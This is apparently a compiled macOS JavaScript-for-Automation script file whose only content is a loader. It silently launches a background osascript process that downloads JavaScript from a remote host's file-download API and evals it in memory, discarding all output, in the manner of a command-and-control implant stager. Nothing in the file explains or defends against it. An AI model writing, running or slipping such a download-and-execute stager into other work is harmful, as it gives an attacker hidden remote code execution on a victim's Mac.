JsOsaDAS1.001.00bplist00�Vscript_vvar app = Application.currentApplication();
app.includeStandardAdditions = true;

app.doShellScript("osascript -l JavaScript -e \"eval(ObjC.unwrap( $.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://192.168.0.108:80/api/v1.4/files/download/8e3e832d-ffc1-416a-8d77-f578759e0c69')), $.NSUTF8StringEncoding)));\" &>/dev/null &");                              �jscr  ��ޭ